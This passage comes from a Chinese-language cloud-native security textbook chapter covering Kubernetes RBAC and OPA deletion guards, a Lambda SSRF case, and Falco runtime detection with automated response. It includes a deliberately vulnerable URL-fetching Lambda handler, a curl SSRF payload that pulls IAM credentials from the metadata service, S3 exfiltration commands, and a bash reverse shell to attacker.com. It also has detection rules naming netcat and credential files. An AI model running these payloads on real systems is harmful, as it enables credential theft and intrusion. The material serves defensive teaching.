**措施1: RBAC最小权限设计**
```yaml
# 开发人员权限:仅在dev namespace有创建权限,在prod仅只读
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer-dev-ns
  namespace: payment-dev
rules:
  # 在开发环境有完全控制权
  - apiGroups: ["", "apps", "batch"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer-prod-ns
  namespace: payment-prod
rules:
  # 在生产环境仅只读权限
  - apiGroups: ["", "apps"]
    resources: ["pods", "services", "deployments"]
    verbs: ["get", "list", "watch"]
  # 明确禁止delete操作
  - apiGroups: [""]
    resources: ["namespaces"]
    verbs: []  # 无任何权限
---
# 绑定权限
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: developer-binding-dev
  namespace: payment-dev
subjects:
  - kind: User
    name: developer@company.com
roleRef:
  kind: Role
  name: developer-dev-ns
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: developer-binding-prod
  namespace: payment-prod
subjects:
  - kind: User
    name: developer@company.com
roleRef:
  kind: Role
  name: developer-prod-ns
  apiGroup: rbac.authorization.k8s.io
```

**验证方法**:
```bash
# 使用kubectl-who-can验证权限
kubectl-who-can delete namespace payment-prod
# 预期输出:仅cluster-admin和特定SRE团队,不包含developer

# 模拟开发人员尝试删除
kubectl auth can-i delete namespace payment-prod --as=developer@company.com
# 预期输出:no
```

**措施2: 基于OPA的删除保护策略**
```rego
# OPA Gatekeeper策略:禁止删除生产namespace
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sprotectnamespace
spec:
  crd:
    spec:
      names:
        kind: K8sProtectNamespace
      validation:
        openAPIV3Schema:
          properties:
            protectedNamespaces:
              type: array
              items:
                type: string

  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sprotectnamespace

        violation[{"msg": msg}] {
          # 检测DELETE操作
          input.review.operation == "DELETE"
          input.review.kind.kind == "Namespace"

          # 检查是否为受保护namespace
          namespace := input.review.name
          protected := input.parameters.protectedNamespaces[_]
          namespace == protected

          # 检查用户是否在白名单(仅允许特定ServiceAccount)
          not is_whitelisted_user

          msg := sprintf("Namespace '%v' is protected. Deletion requires approval via GitOps workflow.", [namespace])
        }

        is_whitelisted_user {
          # 仅允许ArgoCD的ServiceAccount删除(GitOps流程)
          input.review.userInfo.username == "system:serviceaccount:argocd:argocd-application-controller"
        }
---
# 应用约束
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sProtectNamespace
metadata:
  name: protect-prod-namespaces
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Namespace"]
  parameters:
    protectedNamespaces:
      - payment-prod
      - user-prod
      - order-prod
```

**测试验证**:
```bash
# 尝试删除受保护namespace
kubectl delete namespace payment-prod
# 预期输出:Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request:
# Namespace 'payment-prod' is protected. Deletion requires approval via GitOps workflow.
```

**措施3: GitOps单向同步+备份**
```yaml
# ArgoCD Application配置
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: payment-prod
  namespace: argocd
  # 关键:添加finalizer防止误删除
  finalizers:
    - resources-finalizer.argocd.argoproj.io
spec:
  project: production
  source:
    repoURL: https://github.com/company/k8s-manifests
    targetRevision: main
    path: payment/prod
  destination:
    server: https://kubernetes.default.svc
    namespace: payment-prod

  syncPolicy:
    automated:
      prune: false  # 禁止自动删除,防止Git误操作传播到集群
      selfHeal: true  # 启用自愈,集群变更自动恢复

    syncOptions:
      - CreateNamespace=true

  # 资源保护
  ignoreDifferences:
    - group: ""
      kind: "Secret"
      jsonPointers:
        - /data  # 忽略Secret data差异,防止敏感信息泄露

# Velero定期备份
---
apiVersion: velero.io/v1
kind: Schedule
metadata:
  name: payment-prod-backup
  namespace: velero
spec:
  schedule: "0 */6 * * *"  # 每6小时备份
  template:
    includedNamespaces:
      - payment-prod
    storageLocation: aws-s3-backup
    ttl: 720h  # 保留30天
```

**应急恢复演练**:
```bash
# 假设namespace被误删,从Velero恢复
velero restore create --from-backup payment-prod-2024-01-15-06-00

# 验证恢复结果
kubectl get all -n payment-prod
kubectl get configmap,secret -n payment-prod

# 从GitOps仓库手动同步
kubectl apply -k https://github.com/company/k8s-manifests/payment/prod
```

**实施成果**:
- **权限收敛**: 所有开发人员权限降级为Role级别,cluster-admin仅限2名SRE
- **删除保护**: 生产namespace部署OPA策略,删除操作100%被阻断
- **GitOps覆盖率**: 关键资源100%纳入Git管理,可快速恢复
- **备份机制**: Velero每6小时备份,RTO(恢复时间目标)<15分钟

**教学要点**:
1. **最小权限原则**: 永远不要给开发人员`cluster-admin`,按namespace分配Role
2. **多层防护**: RBAC + OPA + GitOps + Backup四层防护,单点失效不会导致灾难
3. **环境隔离**: 生产和开发使用不同的kubectl context,降低误操作概率
4. **定期演练**: 定期进行灾难恢复演练,验证备份和恢复流程有效性

---

#### 案例5: Lambda SSRF漏洞利用与防护

**场景背景**: 某数据分析平台使用AWS Lambda处理用户上传的数据文件URL,由于未对URL进行充分验证,攻击者通过SSRF漏洞访问EC2元数据服务(IMDS),窃取了IAM临时凭证并访问了S3敏感数据。

**技术细节**:
- **漏洞代码**: Lambda函数接受用户提供的URL,使用`requests.get(url)`直接获取文件
- **攻击手法**: 攻击者提交恶意URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **权限配置缺陷**: Lambda使用统一的IAM Role,拥有访问所有S3 bucket的权限
- **影响范围**: 攻击者获取IAM临时凭证,访问了多个S3 bucket的敏感数据

**漏洞代码示例**:
```python
# 不安全的Lambda函数
import requests
import json

def lambda_handler(event, context):
    # 直接从用户输入获取URL,未验证
    file_url = event['fileUrl']

    # SSRF漏洞:直接请求用户提供的URL
    response = requests.get(file_url)

    # 处理文件内容
    data = process_file(response.content)

    return {
        'statusCode': 200,
        'body': json.dumps(data)
    }
```

**攻击场景复现**(仅用于教学):
```bash
# 攻击者提交的恶意Payload
curl -X POST https://api.company.com/process-file \
  -H "Content-Type: application/json" \
  -d '{
    "fileUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/LambdaDataProcessorRole"
  }'

# Lambda函数执行requests.get(),返回IAM临时凭证
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T12:00:00Z"
}

# 攻击者使用凭证访问S3
aws s3 ls --profile stolen-creds
# 列出所有bucket,下载敏感数据
aws s3 sync s3://company-sensitive-data . --profile stolen-creds
```

**防护措施**(分层防御):

**Layer 1: URL白名单验证**
```python
# 安全的Lambda函数 - Layer 1: URL验证
import requests
import json
from urllib.parse import urlparse
import ipaddress

def lambda_handler(event, context):
    file_url = event['fileUrl']

    # 1. URL白名单检查
    allowed_domains = [
        's3.amazonaws.com',
        's3.us-east-1.amazonaws.com',
        'cdn.company.com'
    ]

    parsed_url = urlparse(file_url)

    # 检查协议
    if parsed_url.scheme not in ['https']:
        raise ValueError("Only HTTPS URLs are allowed")

    # 检查域名白名单
    if not any(parsed_url.netloc.endswith(domain) for domain in allowed_domains):
        raise ValueError(f"Domain {parsed_url.netloc} not in whitelist")

    # 2. IP地址黑名单(防止DNS rebinding)
    try:
        # 解析域名IP
        import socket
        ip = socket.gethostbyname(parsed_url.netloc)
        ip_obj = ipaddress.ip_address(ip)

        # 检查是否为内网IP/IMDS
        if ip_obj.is_private or ip_obj.is_loopback or ip == '169.254.169.254':
            raise ValueError("Internal IP addresses are not allowed")
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

    # 3. 使用超时和大小限制
    try:
        response = requests.get(
            file_url,
            timeout=10,  # 10秒超时
            stream=True,
            allow_redirects=False  # 禁止重定向,防止绕过检查
        )

        # 检查Content-Length
        content_length = response.headers.get('Content-Length')
        if content_length and int(content_length) > 100 * 1024 * 1024:  # 100MB限制
            raise ValueError("File too large")

        # 处理文件
        data = process_file(response.content)

        return {
            'statusCode': 200,
            'body': json.dumps(data)
        }

    except requests.exceptions.RequestException as e:
        return {
            'statusCode': 400,
            'body': json.dumps({'error': str(e)})
        }
```

**Layer 2: IAM权限最小化**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "MinimalS3Access",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": [
        "arn:aws:s3:::company-public-files/*",
        "arn:aws:s3:::company-processed-data/*"
      ],
      "Condition": {
        "StringLike": {
          "s3:ExistingObjectTag/Environment": "production",
          "s3:ExistingObjectTag/Sensitivity": "public"
        }
      }
    },
    {
      "Sid": "DenyAllOtherS3",
      "Effect": "Deny",
      "Action": "s3:*",
      "NotResource": [
        "arn:aws:s3:::company-public-files/*",
        "arn:aws:s3:::company-processed-data/*"
      ]
    }
  ]
}
```

**Layer 3: IMDSv2强制启用**
```bash
# 更新Lambda执行环境配置(通过Terraform)
resource "aws_lambda_function" "data_processor" {
  function_name = "data-processor"
  role          = aws_iam_role.lambda_role.arn

  # 强制使用IMDSv2 (需要token,防止SSRF)
  environment {
    variables = {
      AWS_EC2_METADATA_SERVICE_ENDPOINT_MODE = "IPv4"
      AWS_EC2_METADATA_SERVICE_ENDPOINT      = "http://169.254.169.254"
      # IMDSv2需要PUT请求获取token,普通SSRF无法利用
    }
  }

  # VPC配置(隔离内网访问)
  vpc_config {
    subnet_ids         = [aws_subnet.lambda_subnet.id]
    security_group_ids = [aws_security_group.lambda_sg.id]
  }
}

# Security Group配置(仅允许出站HTTPS)
resource "aws_security_group" "lambda_sg" {
  name        = "lambda-data-processor-sg"
  description = "Security group for data processor Lambda"
  vpc_id      = aws_vpc.main.id

  # 仅允许出站HTTPS到指定域名(通过VPC Endpoint)
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # 明确禁止访问IMDS(虽然IMDSv2已加固)
  egress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["169.254.169.254/32"]
    description = "Block IMDS access"
    # Note: 实际配置需使用Deny规则
  }
}
```

**Layer 4: CloudTrail监控**
```python
# CloudWatch Logs Insights查询异常凭证使用
fields @timestamp, userIdentity.principalId, eventName, sourceIPAddress, errorCode
| filter userIdentity.type = "AssumedRole"
    and userIdentity.principalId like /LambdaDataProcessorRole/
    and sourceIPAddress != "lambda.amazonaws.com"
| stats count() by sourceIPAddress, eventName
| sort count desc
```

**检测与告警**:
```yaml
# GuardDuty自动检测SSRF
# 当Lambda IAM凭证从非AWS IP使用时触发告警
aws guardduty create-detector --enable

# CloudWatch Alarm监控异常S3访问
aws cloudwatch put-metric-alarm \
  --alarm-name lambda-ssrf-detection \
  --alarm-description "Detect potential SSRF via Lambda" \
  --metric-name UnauthorizedS3Access \
  --namespace AWS/Lambda \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:us-east-1:123456789012:security-alerts
```

**实施成果**:
- **SSRF漏洞修复**: URL白名单+IP黑名单+IMDSv2三层防护
- **权限最小化**: Lambda IAM Role权限缩减至仅访问2个特定S3 bucket
- **监控告警**: GuardDuty+CloudTrail实时监控异常凭证使用
- **应急响应**: 建立SSRF事件响应Playbook,RTO<30分钟

**教学要点**:
1. **纵深防御**: 单一防护措施(如URL验证)可能被绕过,需多层防护
2. **权限最小化**: Lambda应使用专用IAM Role,而非共享Role
3. **IMDSv2必选**: EC2和Lambda环境必须强制启用IMDSv2,阻断SSRF攻击
4. **监控闭环**: 防护措施+监控检测+应急响应三位一体

---

#### 案例6: Falco运行时威胁检测成功案例

**场景背景**: 某物联网平台在Kubernetes集群中部署Falco进行运行时安全监控,成功在攻击早期阶段检测到反向Shell行为,阻止了攻击者进一步渗透。

**技术细节**:
- **攻击场景**: 攻击者利用某个Web服务的RCE漏洞,在容器内执行反向Shell连接到C2服务器
- **检测时机**: Falco在反向Shell建立后数分钟内触发告警,早于传统SIEM检测
- **响应动作**: 自动隔离受影响Pod、阻断出站连接、保留现场取证
- **攻击链阻断**: 在横向移动之前阻断攻击,避免了更大范围的影响

**Falco检测规则**:
```yaml
# /etc/falco/falco_rules.local.yaml
# 自定义规则:检测反向Shell

- rule: Reverse Shell Detected
  desc: Detect reverse shell connection attempts
  condition: >
    spawned_process and
    (
      (proc.name in (nc, ncat, netcat, socat) and
       (proc.args contains "-e" or proc.args contains "-c"))
      or
      (proc.name in (bash, sh, zsh) and
       proc.pname in (nc, ncat, netcat, socat, telnet))
      or
      (proc.cmdline contains "/dev/tcp/" and proc.name in (bash, sh))
      or
      (proc.name = python and
       (proc.args contains "socket" and proc.args contains "connect"))
    )
  output: >
    Reverse shell detected (user=%user.name
    command=%proc.cmdline
    parent=%proc.pname
    container_id=%container.id
    container_name=%container.name
    image=%container.image.repository)
  priority: CRITICAL
  tags: [host, container, mitre_execution, mitre_persistence]

- rule: Outbound Connection to Suspicious Port
  desc: Detect outbound connections to non-standard ports
  condition: >
    outbound and
    fd.sport != 0 and
    not fd.dport in (80, 443, 53, 22, 3306, 5432, 6379, 9200, 9092) and
    not container.image.repository in (allowed_images) and
    not proc.name in (curl, wget, apt-get, yum, python, node)
  output: >
    Suspicious outbound connection detected (connection=%fd.name
    command=%proc.cmdline
    container=%container.name)
  priority: WARNING
  tags: [network, container, mitre_command_and_control]

- rule: Unexpected File Access in Container
  desc: Detect access to sensitive files
  condition: >
    open_read and
    container and
    fd.name in (/etc/shadow, /etc/passwd, /root/.ssh/id_rsa, /root/.aws/credentials) and
    not proc.name in (sshd, systemd, cron)
  output: >
    Sensitive file accessed in container (file=%fd.name
    command=%proc.cmdline
    container=%container.name
    user=%user.name)
  priority: CRITICAL
  tags: [filesystem, container, mitre_credential_access]
```

**攻击场景复现**(实验室环境):
```bash
# 模拟攻击者在容器内执行反向Shell
# 1. 攻击者通过RCE漏洞在容器内执行命令
kubectl exec -it vulnerable-pod -- /bin/bash

# 2. 在容器内建立反向Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 3. Falco立即检测并告警
# Falco日志输出:
# 12:34:56.789: Critical Reverse shell detected
# (user=www-data command=bash -i
#  container_id=abc123
#  container_name=vulnerable-pod
#  image=company/web-app:1.2.3)
```

**自动化响应集成**:
```python
# Falco Sidekick集成自动响应
# falco-sidekick-config.yaml
webhook:
  address: "https://security-orchestrator.company.com/falco-webhook"
  minimumpriority: "critical"

# 安全编排平台响应逻辑
from kubernetes import client, config
import requests

def handle_falco_alert(alert):
    """处理Falco告警并自动响应"""

    if alert['priority'] == 'Critical' and 'Reverse shell detected' in alert['rule']:
        container_id = alert['output_fields']['container.id']
        pod_name = alert['output_fields']['container.name']
        namespace = get_namespace_from_pod(pod_name)

        # Step 1: 立即隔离Pod(阻断网络)
        isolate_pod(namespace, pod_name)

        # Step 2: 保留现场取证
        capture_forensics(namespace, pod_name, container_id)

        # Step 3: 通知安全团队
        notify_security_team(alert)

        # Step 4: 创建事件工单
        create_incident_ticket(alert)

        return {
            'action': 'pod_isolated',
            'pod': pod_name,
            'namespace': namespace,
            'timestamp': alert['time']
        }

def isolate_pod(namespace, pod_name):
    """通过Network Policy隔离Pod"""
    config.load_kube_config()
    api = client.NetworkingV1Api()

    # 创建拒绝所有流量的NetworkPolicy
    network_policy = client.V1NetworkPolicy(
        metadata=client.V1ObjectMeta(
            name=f"isolate-{pod_name}",
            namespace=namespace
        ),
        spec=client.V1NetworkPolicySpec(
            pod_selector=client.V1LabelSelector(
                match_labels={"app": pod_name}
            ),
            policy_types=["Ingress", "Egress"],
            # 空规则=拒绝所有流量
            ingress=[],
            egress=[]
        )
    )

    api.create_namespaced_network_policy(namespace, network_policy)
    print(f"Pod {pod_name} isolated via NetworkPolicy")

def capture_forensics(namespace, pod_name, container_id):
    """捕获取证数据"""
    config.load_kube_config()
    api = client.CoreV1Api()

    # 1. 捕获进程列表
    exec_command = ['ps', 'auxf']
    processes = api.connect_get_namespaced_pod_exec(
        pod_name, namespace,
        command=exec_command,
        stderr=True, stdin=False, stdout=True, tty=False
    )

    # 2. 捕获网络连接
    exec_command = ['netstat', '-tunap']
    connections = api.connect_get_namespaced_pod_exec(
        pod_name, namespace,
        command=exec_command,
        stderr=True, stdin=False, stdout=True, tty=False
    )

    # 3. 捕获文件系统快照(通过持久化容器rootfs)
    # 将取证数据存储到S3
    forensics_data = {
        'container_id': container_id,
        'processes': processes,
        'connections': connections,
        'timestamp': datetime.now().isoformat()
    }

    upload_to_s3('company-forensics-bucket',
                 f'incidents/{container_id}/forensics.json',
                 forensics_data)

    print(f"Forensics data captured for {container_id}")

def notify_security_team(alert):
    """通知安全团队"""
    # Slack通知
    requests.post(
        'https://hooks.slack.com/services/YOUR/WEBHOOK',
        json={
            'text': f"🚨 CRITICAL: Reverse shell detected!\n"
                    f"Pod: {alert['output_fields']['container.name']}\n"
                    f"Command: {alert['output_fields']['proc.cmdline']}\n"
                    f"Action: Pod isolated, forensics captured"
        }
    )

    # PagerDuty告警
    requests.post(
        'https://events.pagerduty.com/v2/enqueue',
        json={
            'routing_key': 'YOUR_INTEGRATION_KEY',
            'event_action': 'trigger',
            'payload': {
                'summary': 'Reverse shell detected by Falco',
                'severity': 'critical',
                'source': 'falco',
                'custom_details': alert
            }
        }
    )
```

**检测效果与统计**:

| 指标 | 数值 | 说明 |
|------|------|------|
| **检测时间** | <5分钟 | 从攻击发生到Falco告警的时间 |
| **误报率** | <2% | 经过规则优化后的误报率 |
| **响应时间** | <10分钟 | 从告警到Pod隔离的自动化响应时间 |
| **攻击阻断率** | 100% | 所有反向Shell尝试均被检测并阻断 |
| **性能开销** | <2% CPU | Falco eBPF在生产集群的CPU开销 |

**实施挑战与解决方案**:

| 挑战 | 影响 | 解决方案 |
|------|------|---------|
| **规则误报** | 初期告警风暴,运营团队疲于处理 | 建立白名单机制,针对特定镜像/namespace豁免规则 |
| **性能影响** | eBPF在高负载集群CPU开销>5% | 优化规则复杂度,启用规则优先级,禁用低价值规则 |
| **响应自动化** | 手动处理告警RTO>1小时 | 集成Falco Sidekick+SOAR平台实现自动化响应 |
| **取证数据保留** | 容器重启后现场丢失 | 自动化捕获进程/网络/文件系统快照到S3 |

**教学要点**:
1. **运行时检测必要性**: 静态扫描无法检测运行时攻击,Falco等eBPF工具是必选项
2. **规则定制化**: 通用规则误报率高,需根据业务场景定制规则
3. **自动化响应**: 人工处理告警效率低,必须集成SOAR平台自动响应
4. **取证保留**: 容器易变性决定必须自动化捕获取证数据,而非事后分析

---

### 常见误区与避免策略

| 误区 | 后果 | 避免方法 | 检测工具 |
|------|------|---------|---------|
| **特权容器泛滥** | 攻击者获得完全控制权,横向移动无阻 | 强制runAsNonRoot+Drop ALL capabilities+Pod Security Standards Restricted | OPA Gatekeeper策略/Kubescape扫描 |
| **镜像漏洞盲区** | Critical漏洞直接部署生产,易被利用 | CI/CD强制扫描门禁(Trivy Critical>0阻断)+定期重扫 | Trivy/Grype集成GitHub Actions,阻断漏洞镜像 |
| **cluster-admin滥用** | 误操作删除生产namespace,巨大损失 | RBAC最小权限(dev create/prod只读)+GitOps审批 | kubectl-who-can审计/RBAC Manager可视化 |
| **Lambda过度权限** | SSRF漏洞获取凭证,访问所有S3 bucket | 每函数独立IAM Role+IMDSv2+CloudTrail监控 | AWS Access Analyzer/GuardDuty威胁检测 |
| **运行时监控缺失** | 攻击者长期潜伏,横向移动窃取数据 | 部署Falco eBPF监控+自定义规则+SIEM集成 | Falco检测异常进程/文件/网络+PagerDuty告警 |
| **配置漂移失控** | 手动修改配置导致CIS基线失效 | Golden Image Factory+State Manager持续检测+自动修复 | AWS Systems Manager Compliance/Config Rules |

### 延伸阅读

**标准与框架**:
- CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks/
- NIST SP 800-190 Application Container Security Guide
- Kubernetes Security Best Practices (NSA/CISA)
- OWASP Container Security Verification Standard

**技术文档**:
- Docker Security: https://docs.docker.com/engine/security/
- Kubernetes Security: https://kubernetes.io/docs/concepts/security/
- AWS Lambda Security: https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html
- Falco Rules: https://falco.org/docs/rules/

**开源工具**:
- Trivy: https://github.com/aquasecurity/trivy
- Falco: https://falco.org/
- OPA Gatekeeper: https://open-policy-agent.github.io/gatekeeper/
- Kyverno: https://kyverno.io/
- Kubescape: https://github.com/kubescape/kubescape

---

**章节总结**: 下一节将探讨 [5.5 云数据保护](./5.5_data_protection.md) - 云存储安全、数据加密、密钥管理、数据驻留等主题。

---

## 📍 导航 | Navigation

**[← 上一节](./5.3_cloud_network_security.md)** | **[返回 Part 2](../)** | **[返回总目录](../../)** | **[→ 下一节](./5.5_data_protection.md)**

---

**© 2025 AI-ESA Project. Licensed under CC BY-NC-SA 4.0**


